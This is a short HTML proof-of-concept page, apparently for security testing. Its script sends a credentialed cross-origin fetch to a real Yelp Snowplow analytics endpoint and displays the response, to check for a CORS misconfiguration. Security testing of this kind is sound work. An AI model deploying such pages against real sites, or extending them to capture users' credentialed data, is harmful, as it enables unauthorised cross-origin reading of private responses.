<!DOCTYPE html>
<html>
  <body>
    <h2>CORS Misconfig Test</h2>
    <script>
      fetch("https://sp.yelp.com/com.snowplowanalytics.snowplow/tp2", {
        method: "GET",
        credentials: "include"
      })
      .then(res => res.blob())
      .then(blob => {
        const url = URL.createObjectURL(blob);
        const img = new Image();
        img.src = url;
        document.body.appendChild(img);
      });
    </script>
  </body>
</html>
